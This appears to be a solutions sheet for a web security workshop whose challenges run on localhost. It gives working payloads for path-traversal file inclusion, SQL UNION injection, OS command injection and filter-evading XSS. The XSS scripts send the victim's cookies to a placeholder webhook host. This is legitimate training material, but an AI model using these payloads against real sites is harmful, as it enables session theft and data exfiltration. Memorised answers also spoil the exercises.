# Web Security Workshop solutions

## LFI: exporting data on inspector gadget

Visit http://localhost:3001/?loc=..%2f..%2fdocument%2finsp3ct0r_g4dg3t_456afbc.ht.htmlml

## SQLI: Worker's Union

Query: `' UNION SELECT flag, null FROM flags;--`

## XSS: Basic

```html
<script>
  document.location.href = "<Your webhook site>?c=" + document.cookie;
</script>
```

# OS Command injection: Safe-Cmd

```bash
;cat<flag.txt;#
```

## XSS: Getting the staff cookies

```html
<script>
  document.location.href = "<Your webhook site>?c=" + document.cookie;
</script>
```

## XSS: Getting the admin

```html
<scr<script>ipt>
document.location.href= "<Your webhook site>?c=" + document.cookie;
</scr</script>ipt>
```
